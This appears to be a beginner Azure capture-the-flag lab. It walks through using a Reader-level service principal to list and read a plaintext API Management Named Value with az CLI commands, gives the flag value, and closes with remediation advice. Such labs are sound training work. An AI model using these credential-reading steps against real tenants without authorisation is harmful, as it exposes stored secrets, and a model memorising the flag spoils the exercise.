# APIM Named Value — Plaintext Secret Exposure

**Provider**: Azure  
**Difficulty**: Beginner  
**MITRE ATT&CK**: [T1552.001 — Credentials in Files](https://attack.mitre.org/techniques/T1552/001/)

## Scenario

You have obtained credentials for an Azure service principal with Reader access on a resource group. The resource group contains an Azure API Management instance. A developer has stored a sensitive value as a Named Value without marking it as a secret, making it readable through the management API.

## Objective

Retrieve the flag stored as a plaintext Named Value in Azure API Management.

## Permissions

The attacker service principal has:

- `Reader` on the resource group (built-in role)

## Attack Path

1. Authenticate with the provided service principal credentials:
   ```bash
   az login --service-principal \
     --username <client-id> \
     --password <client-secret> \
     --tenant <tenant-id>
   ```
2. List Named Values in the APIM instance:
   ```bash
   az apim nv list \
     --service-name <apim-name> \
     --resource-group <resource-group>
   ```
3. Read the value of the `flag-key` Named Value:
   ```bash
   az apim nv show \
     --service-name <apim-name> \
     --resource-group <resource-group> \
     --named-value-id flag-key \
     --query value \
     -o tsv
   ```

## Flag

`CUMULONIMBUS{AP1M_N4m3d_V4lu3_Pl41nt3xt}`

## Remediation

- Mark Named Values containing secrets with `secret = true` — this stores the value in a linked Key Vault and prevents retrieval via the management API.
- Link APIM Named Values to Azure Key Vault secrets instead of storing values inline.
- Apply least-privilege RBAC — avoid granting broad Reader access on resource groups containing APIM instances.
- Audit Named Values regularly to ensure secrets are not stored in plaintext.
